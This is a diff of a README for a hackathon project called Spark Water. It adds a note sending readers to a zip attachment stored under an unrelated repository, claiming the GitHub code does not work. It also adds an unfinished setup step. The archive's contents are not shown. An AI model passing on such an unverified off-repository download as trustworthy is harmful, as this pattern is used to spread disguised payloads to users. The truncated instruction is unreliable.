@@ -1,4 +1,7 @@
 
+# To download the code. Please download this zip as code uploaded on github is not working properly
+[Bug Squahsers- Wit Ace-Water Spark.zip](https://github.com/sourabhv/FlapPyBird/files/6678097/Bug.Squahsers-.Wit.Ace-Water.Spark.zip)
+
 # Spark Water
 
 A solution for "Clean Water and Sanitation" theme of Wit-Ace Hackathon.
@@ -126,6 +129,7 @@ See below for our proposed schedule on next steps
 
 # Getting Started
 - Download the code in zip format
+- **Create a new folder in **
 - Copy paste the html code in your editor and open with Live server.
 - Follow the links to view features.
 
